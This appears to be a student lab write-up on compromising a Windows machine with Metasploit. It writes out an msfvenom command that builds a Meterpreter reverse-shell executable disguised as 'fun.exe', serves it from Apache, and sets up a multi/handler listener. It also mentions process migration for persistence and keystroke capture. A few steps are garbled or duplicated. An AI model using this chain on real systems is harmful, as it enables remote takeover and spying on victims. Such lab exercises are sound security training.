# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="739" height="339" alt="Screenshot 2026-02-14 132256" src="https://github.com/user-attachments/assets/a855b92b-30c9-42a8-b780-58712831fb35" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="765" height="173" alt="Screenshot 2026-02-14 132347" src="https://github.com/user-attachments/assets/61c47eb6-3bc7-42ea-b6bf-0014cdad7ece" />


copy the fun.exe into the apache /var/www/html folder
Start apache server
sudo systemctl apache2 start
Check the status of apache2
Invoke msfconsole:
## OUTPUT:
<img width="990" height="945" alt="Screenshot 2026-02-14 132437" src="https://github.com/user-attachments/assets/6605fba8-70bf-4a5b-b01f-8230bdb30a2b" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="811" height="824" alt="Screenshot 2026-02-14 132453" src="https://github.com/user-attachments/assets/76d3e6da-47da-4ee4-bd5c-db2790f9ac2e" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="986" height="194" alt="Screenshot 2026-02-14 132515" src="https://github.com/user-attachments/assets/4083de22-af65-408d-b745-dbe7910dbc76" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1283" height="877" alt="Screenshot 2026-02-14 132540" src="https://github.com/user-attachments/assets/1eb3ae5b-4ea0-4111-b642-08b2a2163fb9" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer


screenshare	Shows the keystrokes captured so far
## OUTPUT:
<img width="983" height="95" alt="Screenshot 2026-02-14 132630" src="https://github.com/user-attachments/assets/d130fb0d-5078-4b2a-8a7f-60e91c202163" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
